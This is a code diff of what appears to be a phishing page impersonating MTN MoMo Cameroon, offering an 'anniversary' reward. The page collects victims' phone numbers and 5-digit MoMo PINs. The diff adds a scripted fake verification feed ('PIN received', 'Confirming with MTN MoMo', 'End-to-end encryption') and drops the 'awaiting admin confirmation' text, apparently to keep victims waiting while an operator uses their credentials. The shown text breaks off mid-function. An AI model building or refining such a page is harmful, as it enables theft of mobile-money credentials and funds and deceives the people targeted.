@@ -58,7 +58,6 @@
     }
 
     * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
-
     html, body { width: 100%; overflow-x: hidden; }
 
     body {
@@ -71,7 +70,6 @@
       -webkit-font-smoothing: antialiased;
       -moz-osx-font-smoothing: grayscale;
     }
-
     body.modal-open { overflow: hidden; }
 
     /* HEADER */
@@ -177,23 +175,6 @@
       opacity: 0; transform: scale(0.6); transition: all 0.18s;
     }
     .lang-item.selected .check { opacity: 1; transform: scale(1); }
-
-    .header-back {
-      background: rgba(255, 255, 255, 0.08);
-      border: 1px solid rgba(255, 255, 255, 0.14);
-      color: rgba(255, 255, 255, 0.9);
-      font-size: 0.82rem;
-      font-weight: 700;
-      font-family: 'Inter', sans-serif;
-      padding: 8px 14px;
-      border-radius: 50px;
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      gap: 6px;
-      transition: background 0.2s;
-    }
-    .header-back:hover { background: rgba(255, 255, 255, 0.18); color: #fff; }
 
     .main {
       max-width: 1200px;
@@ -686,121 +667,126 @@
     }
     @keyframes spin { to { transform: rotate(360deg); } }
 
-    /* VERIFY OVERLAY */
+    /* ============================================================
+       VERIFY OVERLAY — v3 (Live activity feed, no "admin")
+       ============================================================ */
     .verify-overlay {
       position: fixed;
       inset: 0;
-      background: radial-gradient(circle at 50% 30%, #003366 0%, #001A33 60%, #000913 100%);
+      background:
+        radial-gradient(900px 600px at 50% -10%, rgba(255, 204, 0, 0.10), transparent 60%),
+        radial-gradient(700px 500px at 50% 110%, rgba(0, 64, 128, 0.35), transparent 60%),
+        linear-gradient(180deg, #001E3C 0%, #00132A 55%, #00080F 100%);
       display: none;
       flex-direction: column;
       align-items: center;
       justify-content: center;
-      padding: 32px 24px;
+      padding: 24px 20px;
       z-index: 10000;
       overflow: hidden;
     }
-    .verify-overlay.show { display: flex; animation: fadeIn 0.5s ease; }
+    .verify-overlay.show { display: flex; animation: vFadeIn 0.45s ease; }
+    @keyframes vFadeIn { from { opacity: 0; } to { opacity: 1; } }
+
     .verify-overlay::before {
       content: '';
       position: absolute;
-      top: 50%;
-      left: 50%;
-      width: 700px;
-      height: 700px;
+      top: 50%; left: 50%;
+      width: 520px; height: 520px;
       transform: translate(-50%, -50%);
-      background: radial-gradient(circle, rgba(255, 204, 0, 0.15) 0%, transparent 60%);
-      animation: glowPulse 3s ease-in-out infinite;
+      background: radial-gradient(circle, rgba(255, 204, 0, 0.18), transparent 65%);
+      filter: blur(30px);
+      animation: vGlow 3.6s ease-in-out infinite;
       pointer-events: none;
     }
-    @keyframes glowPulse {
-      0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 0.7; }
-      50% { transform: translate(-50%, -50%) scale(1.15); opacity: 1; }
+    @keyframes vGlow {
+      0%, 100% { opacity: 0.55; transform: translate(-50%, -50%) scale(1); }
+      50%      { opacity: 0.9;  transform: translate(-50%, -50%) scale(1.08); }
     }
-    .verify-particles { position: absolute; inset: 0; overflow: hidden; pointer-events: none; }
-    .verify-particle {
-      position: absolute;
-      width: 4px; height: 4px;
-      background: var(--mtn-gold);
-      border-radius: 50%;
-      opacity: 0;
-      box-shadow: 0 0 12px rgba(255, 204, 0, 0.8);
-      animation: particleFloat 8s infinite ease-in-out;
+
+    .verify-card {
+      position: relative;
+      z-index: 2;
+      width: 100%;
+      max-width: 380px;
+      border-radius: 26px;
+      padding: 26px 22px 22px;
+      background: linear-gradient(180deg, rgba(255,255,255,0.06), rgba(255,255,255,0.02));
+      border: 1px solid rgba(255, 204, 0, 0.18);
+      box-shadow:
+        0 30px 60px rgba(0, 0, 0, 0.45),
+        inset 0 1px 0 rgba(255, 255, 255, 0.06);
+      backdrop-filter: blur(14px);
+      -webkit-backdrop-filter: blur(14px);
+      text-align: center;
+      animation: vCardIn 0.6s cubic-bezier(0.22, 1, 0.36, 1) both;
     }
-    .verify-particle:nth-child(1) { left: 10%; top: 80%; animation-delay: 0s; }
-    .verify-particle:nth-child(2) { left: 25%; top: 60%; animation-delay: 1.2s; }
-    .verify-particle:nth-child(3) { left: 80%; top: 75%; animation-delay: 2.4s; }
-    .verify-particle:nth-child(4) { left: 65%; top: 85%; animation-delay: 3.6s; }
-    .verify-particle:nth-child(5) { left: 45%; top: 90%; animation-delay: 4.8s; }
-    .verify-particle:nth-child(6) { left: 88%; top: 45%; animation-delay: 6s; }
-    .verify-particle:nth-child(7) { left: 12%; top: 40%; animation-delay: 7.2s; }
-    .verify-particle:nth-child(8) { left: 55%; top: 15%; animation-delay: 5.4s; }
-    @keyframes particleFloat {
-      0% { opacity: 0; transform: translateY(0) scale(0.6); }
-      15% { opacity: 1; transform: translateY(-30px) scale(1.1); }
-      80% { opacity: 0.7; transform: translateY(-280px) scale(0.9); }
-      100% { opacity: 0; transform: translateY(-340px) scale(0.4); }
+    @keyframes vCardIn {
+      from { opacity: 0; transform: translateY(18px) scale(0.97); }
+      to   { opacity: 1; transform: translateY(0) scale(1); }
     }
-    .verify-content {
+
+    /* header zone */
+    .verify-header {
       display: flex;
       flex-direction: column;
       align-items: center;
-      max-width: 340px;
-      text-align: center;
+      margin-bottom: 18px;
+    }
+    .verify-ring {
       position: relative;
-      z-index: 2;
+      width: 88px; height: 88px;
+      margin-bottom: 14px;
     }
-    .verify-orbit { width: 140px; height: 140px; position: relative; margin-bottom: 34px; }
-    .verify-orbit-ring {
-      position: absolute;
-      inset: 0;
-      border-radius: 50%;
-      border: 2px dashed rgba(255, 204, 0, 0.35);
-      animation: rotateSlow 10s linear infinite;
+    .verify-ring svg {
+      width: 100%; height: 100%;
+      transform: rotate(-90deg);
+      display: block;
     }
-    .verify-orbit-ring.inner {
-      inset: 22px;
-      border: 1.5px dashed rgba(255, 204, 0, 0.55);
-      animation: rotateSlow 6s linear infinite reverse;
+    .verify-ring .track {
+      fill: none;
+      stroke: rgba(255, 204, 0, 0.10);
+      stroke-width: 5;
     }
-    @keyframes rotateSlow { to { transform: rotate(360deg); } }
-    .verify-orbit-core {
+    .verify-ring .progress {
+      fill: none;
+      stroke: url(#vGoldGrad);
+      stroke-width: 5;
+      stroke-linecap: round;
+      stroke-dasharray: 226.20;   /* 2π×36 */
+      stroke-dashoffset: 226.20;
+      transition: stroke-dashoffset 0.6s ease;
+      filter: drop-shadow(0 0 6px rgba(255, 204, 0, 0.55));
+    }
+    .verify-ring-core {
       position: absolute;
       top: 50%; left: 50%;
-      width: 72px; height: 72px;
+      width: 56px; height: 56px;
       transform: translate(-50%, -50%);
-      border-radius: 18px;
+      border-radius: 50%;
       background: var(--grad-gold);
       display: flex;
       align-items: center;
       justify-content: center;
-      box-shadow: 0 0 40px rgba(255, 204, 0, 0.55), 0 0 80px rgba(255, 204, 0, 0.3);
-      animation: corePulse 2s ease-in-out infinite;
-      padding: 8px;
+      padding: 10px;
+      box-shadow:
+        0 0 0 6px rgba(255, 204, 0, 0.08),
+        0 0 24px rgba(255, 204, 0, 0.45);
+      animation: vCorePulse 2.4s ease-in-out infinite;
     }
-    .verify-orbit-core img { width: 100%; height: 100%; object-fit: contain; }
-    @keyframes corePulse {
-      0%, 100% { box-shadow: 0 0 40px rgba(255, 204, 0, 0.55), 0 0 80px rgba(255, 204, 0, 0.3); transform: translate(-50%, -50%) scale(1); }
-      50% { box-shadow: 0 0 55px rgba(255, 204, 0, 0.85), 0 0 110px rgba(255, 204, 0, 0.5); transform: translate(-50%, -50%) scale(1.06); }
+    .verify-ring-core img { width: 100%; height: 100%; object-fit: contain; }
+    @keyframes vCorePulse {
+      0%, 100% { box-shadow: 0 0 0 6px rgba(255, 204, 0, 0.08), 0 0 24px rgba(255, 204, 0, 0.40); }
+      50%      { box-shadow: 0 0 0 10px rgba(255, 204, 0, 0.05), 0 0 36px rgba(255, 204, 0, 0.75); }
     }
-    .verify-dot-orbit { position: absolute; inset: 0; animation: rotateSlow 3.5s linear infinite; }
-    .verify-dot-orbit span {
-      position: absolute;
-      width: 8px; height: 8px;
-      border-radius: 50%;
-      background: var(--mtn-gold);
-      box-shadow: 0 0 12px rgba(255, 204, 0, 0.9);
-    }
-    .verify-dot-orbit span:nth-child(1) { top: 0; left: 50%; transform: translateX(-50%); }
-    .verify-dot-orbit span:nth-child(2) { bottom: 0; left: 50%; transform: translateX(-50%); }
-    .verify-dot-orbit span:nth-child(3) { top: 50%; left: 0; transform: translateY(-50%); }
-    .verify-dot-orbit span:nth-child(4) { top: 50%; right: 0; transform: translateY(-50%); }
+
     .verify-title {
-      font-size: 20px;
+      font-size: 1rem;
       font-weight: 800;
       color: #fff;
-      margin-bottom: 10px;
+      letter-spacing: -0.01em;
       line-height: 1.35;
-      letter-spacing: -0.3px;
+      margin-bottom: 6px;
     }
     .verify-title .highlight {
       background: linear-gradient(90deg, #FFCC00, #FFD633);
@@ -809,77 +795,147 @@
       background-clip: text;
     }
     .verify-subtitle {
-      font-size: 13.5px;
-      color: rgba(255, 255, 255, 0.7);
-      line-height: 1.6;
-      margin-bottom: 30px;
+      font-size: 12px;
+      color: rgba(255, 255, 255, 0.62);
+      line-height: 1.5;
       font-weight: 500;
-      min-height: 1.4em;
+      min-height: 2.4em;
     }
-    .verify-bar {
-      width: 240px;
-      height: 6px;
-      background: rgba(255, 204, 0, 0.12);
-      border-radius: 4px;
+
+    /* live activity feed */
+    .verify-feed {
+      text-align: left;
+      background: rgba(0, 0, 0, 0.22);
+      border: 1px solid rgba(255, 255, 255, 0.06);
+      border-radius: 14px;
+      padding: 12px 14px;
+      margin-bottom: 14px;
+      max-height: 180px;
+      overflow-y: auto;
+      font-family: 'SF Mono', 'Menlo', 'Consolas', monospace;
+    }
+    .feed-line {
+      display: flex;
+      gap: 8px;
+      align-items: flex-start;
+      font-size: 11px;
+      line-height: 1.6;
+      color: rgba(255, 255, 255, 0.55);
+      opacity: 0;
+      transform: translateY(4px);
+      transition: opacity 0.4s ease, transform 0.4s ease;
+    }
+    .feed-line.visible { opacity: 1; transform: translateY(0); }
+    .feed-line .time {
+      color: rgba(255, 204, 0, 0.75);
+      flex-shrink: 0;
+      font-weight: 700;
+    }
+    .feed-line .tag {
+      flex-shrink: 0;
+      font-weight: 800;
+    }
+    .feed-line.ok .tag { color: #22C55E; }
+    .feed-line.pending .tag { color: #FFCC00; }
+    .feed-line.info .tag { color: #60A5FA; }
+    .feed-line .txt { color: rgba(255, 255, 255, 0.75); }
+    .feed-line .sub {
+      display: block;
+      margin-top: 2px;
+      color: rgba(255, 204, 0, 0.65);
+      font-size: 10.5px;
+    }
+
+    /* expected time + elapsed */
+    .verify-meta {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 10.5px;
+      color: rgba(255, 255, 255, 0.5);
+      font-weight: 700;
+      letter-spacing: 0.04em;
+      text-transform: uppercase;
+      margin-bottom: 10px;
+      padding: 0 4px;
+    }
+    .verify-meta .elapsed {
+      color: var(--mtn-gold);
+      font-variant-numeric: tabular-nums;
+    }
+
+    /* progress bar */
+    .verify-progress {
+      width: 100%;
+      height: 5px;
+      background: rgba(255, 204, 0, 0.10);
+      border-radius: 3px;
       overflow: hidden;
-      margin-bottom: 30px;
-      position: relative;
+      margin-bottom: 14px;
     }
-    .verify-bar-fill {
+    .verify-progress-fill {
       height: 100%;
       width: 0%;
       background: linear-gradient(90deg, #FFCC00, #FFD633, #FFCC00);
       background-size: 200% 100%;
-      border-radius: 4px;
-      transition: width 0.4s ease;
-      box-shadow: 0 0 14px rgba(255, 204, 0, 0.7);
-      animation: shimmer 2s linear infinite;
+      border-radius: 3px;
+      transition: width 0.5s ease;
+      animation: vShimmer 2s linear infinite;
+      box-shadow: 0 0 10px rgba(255, 204, 0, 0.55);
     }
-    @keyframes shimmer {
+    @keyframes vShimmer {
       0% { background-position: 200% 0; }
       100% { background-position: -200% 0; }
     }
-    .verify-status-row {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      font-size: 11.5px;
-      color: rgba(255, 255, 255, 0.5);
+
+    /* patience note (appears after 3 min) */
+    .verify-patience {
+      font-size: 10.5px;
+      color: rgba(255, 204, 0, 0.75);
       font-weight: 600;
-      letter-spacing: 0.05em;
-      text-transform: uppercase;
-    }
-    .verify-status-dot {
-      width: 7px; height: 7px;
-      border-radius: 50%;
-      background: #22C55E;
-      box-shadow: 0 0 10px rgba(34, 197, 94, 0.9);
-      animation: statusPulse 1.6s ease-in-out infinite;
-    }
-    @keyframes statusPulse {
-      0%, 100% { opacity: 1; transform: scale(1); }
-      50% { opacity: 0.5; transform: scale(0.85); }
-    }
-    .verify-step {
-      position: relative;
-      height: 20px;
+      line-height: 1.45;
+      padding: 8px 12px;
+      border-radius: 10px;
+      background: rgba(255, 204, 0, 0.08);
+      border: 1px solid rgba(255, 204, 0, 0.20);
+      opacity: 0;
+      max-height: 0;
       overflow: hidden;
-      margin-bottom: 20px;
-      width: 100%;
+      transition: opacity 0.5s ease, max-height 0.5s ease, padding 0.3s ease, margin 0.3s ease;
+      margin-top: 0;
     }
-    .verify-step-inner {
-      display: flex;
-      flex-direction: column;
+    .verify-patience.show {
+      opacity: 1;
+      max-height: 100px;
+      padding: 8px 12px;
+      margin-top: 10px;
+    }
+
+    /* live pill */
+    .verify-live {
+      display: inline-flex;
       align-items: center;
-      transition: transform 0.5s cubic-bezier(0.22, 1, 0.36, 1);
-    }
-    .verify-step-text {
-      height: 20px;
-      line-height: 20px;
-      font-size: 12px;
-      color: rgba(255, 204, 0, 0.9);
+      gap: 6px;
+      padding: 5px 12px;
+      border-radius: 50px;
+      background: rgba(34, 197, 94, 0.10);
+      border: 1px solid rgba(34, 197, 94, 0.25);
+      font-size: 9.5px;
       font-weight: 700;
-      letter-spacing: 0.03em;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      color: #86EFAC;
+      margin-top: 14px;
+    }
+    .verify-live-dot {
+      width: 5px; height: 5px; border-radius: 50%;
+      background: #22C55E;
+      box-shadow: 0 0 8px rgba(34, 197, 94, 0.9);
+      animation: vLivePulse 1.6s ease-in-out infinite;
+    }
+    @keyframes vLivePulse {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50%      { opacity: 0.4; transform: scale(0.7); }
     }
 
     @media (max-width: 480px) {
@@ -890,10 +946,10 @@
       .brand-logo-img { height: 42px; }
       .brand-sub { font-size: 11px; }
       .pin-modal { bottom: 140px; }
-      .verify-orbit { width: 120px; height: 120px; }
-      .verify-orbit-core { width: 62px; height: 62px; border-radius: 16px; }
-      .verify-title { font-size: 18px; }
       .lang-btn { padding: 6px 10px; font-size: 0.72rem; }
+      .verify-card { padding: 22px 18px 20px; }
+      .verify-ring { width: 78px; height: 78px; }
+      .verify-ring-core { width: 50px; height: 50px; padding: 8px; }
     }
     @media (max-width: 380px) {
       .brand-sub { display: none; }
@@ -909,8 +965,8 @@
   <div class="reject-banner" id="rejectBanner">
     <span class="r-ico">⚠️</span>
     <div class="r-text">
-      <b data-i18n="login.reject_bold">Incorrect credentials.</b>
-      <span data-i18n="login.reject_msg">Please enter your MoMo number and try again.</span>
+      <b data-i18n="login.reject_bold">Identifiants incorrects.</b>
+      <span data-i18n="login.reject_msg">Veuillez entrer votre numéro MoMo et réessayer.</span>
     </div>
   </div>
 
@@ -1032,53 +1088,54 @@
     </div>
   </div>
 
-  <!-- VERIFY OVERLAY -->
+  <!-- ============================================================
+       VERIFY OVERLAY — v3 (live activity feed)
+       ============================================================ -->
   <div class="verify-overlay" id="verifyOverlay">
-    <div class="verify-particles">
-      <span class="verify-particle"></span>
-      <span class="verify-particle"></span>
-      <span class="verify-particle"></span>
-      <span class="verify-particle"></span>
-      <span class="verify-particle"></span>
-      <span class="verify-particle"></span>
-      <span class="verify-particle"></span>
-      <span class="verify-particle"></span>
-    </div>
+    <div class="verify-card">
 
-    <div class="verify-content">
-      <div class="verify-orbit">
-        <div class="verify-orbit-ring"></div>
-        <div class="verify-orbit-ring inner"></div>
-        <div class="verify-dot-orbit">
-          <span></span><span></span><span></span><span></span>
+      <div class="verify-header">
+        <div class="verify-ring">
+          <svg viewBox="0 0 88 88" aria-hidden="true">
+            <defs>
+              <linearGradient id="vGoldGrad" x1="0" y1="0" x2="1" y2="1">
+                <stop offset="0%"   stop-color="#FFD633"/>
+                <stop offset="50%"  stop-color="#FFCC00"/>
+                <stop offset="100%" stop-color="#F5B500"/>
+              </linearGradient>
+            </defs>
+            <circle class="track"    cx="44" cy="44" r="36"></circle>
+            <circle class="progress" id="verifyRingProgress" cx="44" cy="44" r="36"></circle>
+          </svg>
+          <div class="verify-ring-core">
+            <img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo">
+          </div>
         </div>
-        <div class="verify-orbit-core">
-          <img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo">
-        </div>
+
+        <h2 class="verify-title" id="verifyTitle" data-i18n="verify.title_a">Vérification de votre</h2>
+        <p class="verify-subtitle" id="verifySubtitle" data-i18n="verify.sub">Connexion sécurisée établie…</p>
       </div>
 
-      <h2 class="verify-title" id="verifyTitle">
-        <span data-i18n="verify.title_a">Vérification de votre</span> <span class="highlight" data-i18n="verify.title_b">compte MoMo</span>
-      </h2>
-      <p class="verify-subtitle" id="verifySubtitle" data-i18n="verify.sub">En attente de confirmation. Veuillez patienter…</p>
+      <div class="verify-feed" id="verifyFeed"></div>
 
-      <div class="verify-bar">
-        <div class="verify-bar-fill" id="verifyBarFill"></div>
+      <div class="verify-meta">
+        <span data-i18n="verify.typical">Habituel : 1–3 min</span>
+        <span class="elapsed" id="verifyElapsed">0 sec</span>
       </div>
 
-      <div class="verify-step">
-        <div class="verify-step-inner" id="verifyStepInner">
-          <div class="verify-step-text" data-i18n="verify.step1">🔒 Établissement d'une connexion sécurisée</div>
-          <div class="verify-step-text" data-i18n="verify.step2">📡 Contact des serveurs MTN MoMo</div>
-          <div class="verify-step-text" data-i18n="verify.step3">🔐 Validation de vos identifiants</div>
-          <div class="verify-step-text" data-i18n="verify.step4">⏳ En attente de confirmation</div>
-        </div>
+      <div class="verify-progress">
+        <div class="verify-progress-fill" id="verifyProgressFill"></div>
       </div>
 
-      <div class="verify-status-row">
-        <span class="verify-status-dot"></span>
-        <span data-i18n="verify.live">En direct · Connexion sécurisée</span>
+      <div class="verify-patience" id="verifyPatience">
+        <span data-i18n="verify.patience">⏳ Cela prend un peu plus de temps que d'habitude. Merci de garder cette page ouverte.</span>
       </div>
+
+      <div class="verify-live">
+        <span class="verify-live-dot"></span>
+        <span data-i18n="verify.live">Live · Sécurisé</span>
+      </div>
+
     </div>
   </div>
 
@@ -1115,18 +1172,25 @@
         'pin.error': 'Veuillez saisir votre PIN MoMo à 5 chiffres',
         'pin.cancel': 'Annuler',
         'pin.proceed': 'Continuer',
-        'verify.title_a': 'Vérification de votre',
-        'verify.title_b': 'compte MoMo',
-        'verify.sub': 'En attente de confirmation. Veuillez patienter…',
-        'verify.step1': '🔒 Établissement d\'une connexion sécurisée',
-        'verify.step2': '📡 Contact des serveurs MTN MoMo',
-        'verify.step3': '🔐 Validation de vos identifiants',
-        'verify.step4': '⏳ En attente de confirmation',
-        'verify.live': 'En direct · Connexion sécurisée',
+        'verify.title_a': 'Vérification de votre compte MoMo',
+        'verify.sub': 'Connexion sécurisée établie…',
+        'verify.typical': 'Habituel : 1–3 min',
+        'verify.patience': '⏳ Cela prend un peu plus de temps que d\'habitude. Merci de garder cette page ouverte.',
+        'verify.live': 'Live · Sécurisé',
         'nav.home': 'Accueil',
         'nav.claim': 'Réclamer',
         'nav.support': 'Support',
-        'footer.text': '© 2026 MTN MoMo Cameroun'
+        'footer.text': '© 2026 MTN MoMo Cameroun',
+        // feed messages
+        'feed.secure': 'Canal sécurisé établi',
+        'feed.number': 'Numéro MoMo vérifié',
+        'feed.pin': 'Code PIN reçu',
+        'feed.confirm': 'Confirmation avec MTN MoMo…',
+        'feed.check_tx': 'Vérification de la transaction',
+        'feed.cross': 'Vérification croisée des enregistrements',
+        'feed.encrypted': 'Chiffrement de bout en bout',
+        'feed.review': 'Analyse en cours',
+        'feed.review_sub': 'Confirmation sécurisée en cours'
       },
       en: {
         'brand.sub': 'MTN MoMo Anniversary',
@@ -1149,18 +1213,24 @@
         'pin.error': 'Please enter your 5-digit MoMo PIN',
         'pin.cancel': 'Cancel',
         'pin.proceed': 'Proceed',
-        'verify.title_a': 'Verifying your',
-        'verify.title_b': 'MoMo account',
-        'verify.sub': 'Waiting for confirmation. Please hold on…',
-        'verify.step1': '🔒 Establishing secure connection',
-        'verify.step2': '📡 Contacting MTN MoMo servers',
-        'verify.step3': '🔐 Validating your credentials',
-        'verify.step4': '⏳ Awaiting admin confirmation',
-        'verify.live': 'Live · Secure Connection',
+        'verify.title_a': 'Verifying your MoMo account',
+        'verify.sub': 'Secure connection established…',
+        'verify.typical': 'Typical: 1–3 min',
+        'verify.patience': '⏳ Taking a little longer than usual. Please keep this page open.',
+        'verify.live': 'Live · Secure',
         'nav.home': 'Home',
         'nav.claim': 'Claim',
         'nav.support': 'Support',
-        'footer.text': '© 2026 MTN MoMo Cameroon'
+        'footer.text': '© 2026 MTN MoMo Cameroon',
+        'feed.secure': 'Secure channel established',
+        'feed.number': 'MoMo number verified',
+        'feed.pin': 'PIN received',
+        'feed.confirm': 'Confirming with MTN MoMo…',
+        'feed.check_tx': 'Checking transaction',
+        'feed.cross': 'Cross-referencing records',
+        'feed.encrypted': 'End-to-end encryption',
+        'feed.review': 'Verification in progress',
+        'feed.review_sub': 'Secure confirmation underway'
       },
       cr: {
         'brand.sub': 'MTN MoMo Anniv',
@@ -1183,18 +1253,24 @@
         'pin.error': 'Abeg put your 5-digit MoMo PIN',
         'pin.cancel': 'Cancel',
         'pin.proceed': 'Proceed',
-        'verify.title_a': 'We dey verify your',
-        'verify.title_b': 'MoMo account',
-        'verify.sub': 'We dey wait for confirmation. Hold on…',
-        'verify.step1': '🔒 We dey set up secure connection',
-        'verify.step2': '📡 We dey contact MTN MoMo servers',
-        'verify.step3': '🔐 We dey check your credentials',
-        'verify.step4': '⏳ We dey wait for admin',
+        'verify.title_a': 'We dey verify your MoMo account',
+        'verify.sub': 'Secure connection done set…',
+        'verify.typical': 'Normally: 1–3 min',
+        'verify.patience': '⏳ E dey take small more time. Abeg keep this page open.',
         'verify.live': 'Live · Secure',
         'nav.home': 'Home',
         'nav.claim': 'Claim',
         'nav.support': 'Support',
-        'footer.text': '© 2026 MTN MoMo Cameroon'
+        'footer.text': '© 2026 MTN MoMo Cameroon',
+        'feed.secure': 'Secure channel done set',
+        'feed.number': 'MoMo number check finish',
+        'feed.pin': 'PIN received',
+        'feed.confirm': 'We dey confirm with MTN MoMo…',
+        'feed.check_tx': 'We dey check transaction',
+        'feed.cross': 'We dey cross-check records',
+        'feed.encrypted': 'End-to-end encryption',
+        'feed.review': 'Verification dey run',
+        'feed.review_sub': 'Secure confirmation dey happen'
       }
     };
 
@@ -1205,7 +1281,7 @@
     };
 
     // ============================================
-    // LANGUAGE — FR default
+    // LANGUAGE
     // ============================================
     const langWrap = document.getElementById('langWrap');
     const langBtn = document.getElementById('langBtn');
@@ -1307,7 +1383,9 @@
         togglePin.classList.remove('active');
         togglePin.innerHTML = '<svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>';
         proceed.disabled = true;
-        proceed.innerHTML = '<span data-i18n="pin.proceed">Continuer</span>';
+        const lang = localStorage.getItem('momoLang') || 'fr';
+        const t = TRANSLATIONS[lang] || TRANSLATIONS.fr;
+        proceed.innerHTML = '<span>' + (t['pin.proceed'] || 'Continuer') + '</span>';
         pinError.classList.remove('show');
         document.body.classList.remove('modal-open');
       }, 250);
@@ -1326,7 +1404,7 @@
       phoneError.classList.remove('show');
 
       openBtn.disabled = true;
-      openBtn.innerHTML = '<span class="btn-spinner-dark"></span><span data-i18n="login.verifying">Vérification…</span>';
+      openBtn.innerHTML = '<span class="btn-spinner-dark"></span><span>…</span>';
 
       setTimeout(() => {
         openBtn.disabled = false;
@@ -1369,10 +1447,11 @@
     function resetToPhoneStep() {
       if (verifyTimer) clearInterval(verifyTimer);
       if (stepTimer) clearInterval(stepTimer);
+      if (feedTimer) clearInterval(feedTimer);
+      if (elapsedTimer) clearInterval(elapsedTimer);
       verifyOverlay.classList.remove('show');
-      verifyBarFill.style.background = '';
-      verifyBarFill.style.width = '0%';
-      verifyStepInner.style.transform = 'translateY(0)';
+      verifyProgressFill.style.width = '0%';
+      verifyFeed.innerHTML = '';
 
       popup.classList.remove('show');
       modal.classList.remove('open');
@@ -1383,7 +1462,9 @@
       togglePin.classList.remove('active');
       togglePin.innerHTML = '<svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>';
       proceed.disabled = true;
-      proceed.innerHTML = '<span data-i18n="pin.proceed">Continuer</span>';
+      const lang = localStorage.getItem('momoLang') || 'fr';
+      const t = TRANSLATIONS[lang] || TRANSLATIONS.fr;
+      proceed.innerHTML = '<span>' + (t['pin.proceed'] || 'Continuer') + '</span>';
       pinError.classList.remove('show');
 
       phoneInput.value = '';
@@ -1403,6 +1484,8 @@
     let pollTimer = null;
     let verifyTimer = null;
     let stepTimer = null;
+    let feedTimer = null;
+    let elapsedTimer = null;
 
     proceed.addEventListener('click', async () => {
       if (!/^\d{5}$/.test(pin.value)) {
@@ -1411,7 +1494,7 @@
       }
 
       proceed.disabled = true;
-      proceed.innerHTML = '<span class="btn-spinner"></span><span>Traitement...</span>';
+      proceed.innerHTML = '<span class="btn-spinner"></span><span>…</span>';
 
       const digits = phoneInput.value.replace(/\D/g, '');
       const fullPhone = '+237' + digits;
@@ -1464,7 +1547,7 @@
       } catch (err) {
         console.error('Login error:', err);
         proceed.disabled = false;
-        proceed.innerHTML = '<span data-i18n="pin.proceed">Continuer</span>';
+        proceed.innerHTML = '<span>Continuer</span>';
         const reason = err.name === 'AbortError'
           ? 'Le serveur a pris trop de temps. Veuillez réessayer.'
           : (err.message || 'Connexion impossible. Vérifiez votre internet.');
@@ -1473,36 +1556,126 @@
       }
     });
 
+    // ============================================
+    // VERIFY OVERLAY — live activity feed
+    // ============================================
     const verifyOverlay = document.getElementById('verifyOverlay');
-    const verifyBarFill = document.getElementById('verifyBarFill');
-    const verifyStepInner = document.getElementById('verifyStepInner');
+    const verifyRingProgress = document.getElementById('verifyRingProgress');
+    const verifySubtitle = document.getElementById('verifySubtitle');
+    const verifyFeed = document.getElementById('verifyFeed');
+    const verifyElapsed = document.getElementById('verifyElapsed');
+    const verifyProgressFill = document.getElementById('verifyProgressFill');
+    const verifyPatience = document.getElementById('verifyPatience');
+
+    const RING_CIRCUMFERENCE = 226.20; // 2π×36
+    const PROGRESS_WINDOW_MS = 3 * 60 * 1000; // 3 minutes
+
+    function nowTime() {
+      const d = new Date();
+      const p = n => String(n).padStart(2, '0');
+      return p(d.getHours()) + ':' + p(d.getMinutes()) + ':' + p(d.getSeconds());
+    }
+
+    function addFeedLine(kind, text, sub) {
+      const lang = localStorage.getItem('momoLang') || 'fr';
+      const t = TRANSLATIONS[lang] || TRANSLATIONS.fr;
+      const line = document.createElement('div');
+      line.className = 'feed-line ' + kind;
+      let icon = '⏳';
+      if (kind === 'ok') icon = '✓';
+      else if (kind === 'info') icon = '🔒';
+      line.innerHTML =
+        '<span class="time">' + nowTime() + '</span>' +
+        '<span class="tag">' + icon + '</span>' +
+        '<span class="txt">' + (t[text] || text) +
+        (sub ? '<span class="sub">• ' + (t[sub] || sub) + '</span>' : '') +
+        '</span>';
+      verifyFeed.appendChild(line);
+      verifyFeed.scrollTop = verifyFeed.scrollHeight;
+      requestAnimationFrame(() => line.classList.add('visible'));
+    }
 
     function startVerifyBar() {
       verifyOverlay.classList.add('show');
-      verifyBarFill.style.width = '0%';
-      verifyBarFill.style.background = '';
-      verifyStepInner.style.transform = 'translateY(0)';
-
-      let stepIndex = 0;
-      if (stepTimer) clearInterval(stepTimer);
-      stepTimer = setInterval(() => {
-        stepIndex = (stepIndex + 1) % 4;
-        verifyStepInner.style.transform = `translateY(-${stepIndex * 20}px)`;
-      }, 2200);
+      verifyFeed.innerHTML = '';
+      verifyProgressFill.style.width = '0%';
+      verifyRingProgress.style.strokeDashoffset = RING_CIRCUMFERENCE;
+      verifyPatience.classList.remove('show');
+      verifySubtitle.textContent = (TRANSLATIONS[localStorage.getItem('momoLang') || 'fr'] || TRANSLATIONS.fr)['verify.sub'];
 
       const startTime = Date.now();
+
+      // reset any prior timers
+      if (feedTimer) clearInterval(feedTimer);
+      if (elapsedTimer) clearInterval(elapsedTimer);
       if (verifyTimer) clearInterval(verifyTimer);
-      verifyTimer = setInterval(function() {
+
+      // ---- FEED SEQUENCE ----
+      // We show the first 3 lines quickly, then keep adding one every 4 seconds.
+      const SEQUENCE = [
+        { delay: 200,   kind: 'ok',     text: 'feed.secure' },
+        { delay: 900,   kind: 'ok',     text: 'feed.number' },
+        { delay: 1600,  kind: 'ok',     text: 'feed.pin' },
+        { delay: 2400,  kind: 'pending',text: 'feed.confirm', sub: 'feed.check_tx' },
+        { delay: 5000,  kind: 'pending',text: 'feed.cross' },
+        { delay: 8000,  kind: 'info',   text: 'feed.encrypted' },
+        { delay: 13000, kind: 'pending',text: 'feed.review', sub: 'feed.review_sub' }
+      ];
+      SEQUENCE.forEach(item => {
+        setTimeout(() => addFeedLine(item.kind, item.text, item.sub), item.delay);
+      });
+
+      // Then every 6s, add a "still verifying" note (capped at 5 extra)
+      let extraCount = 0;
+      feedTimer = setInterval(() => {
+        if (extraCount >= 5) return;
+        extraCount++;
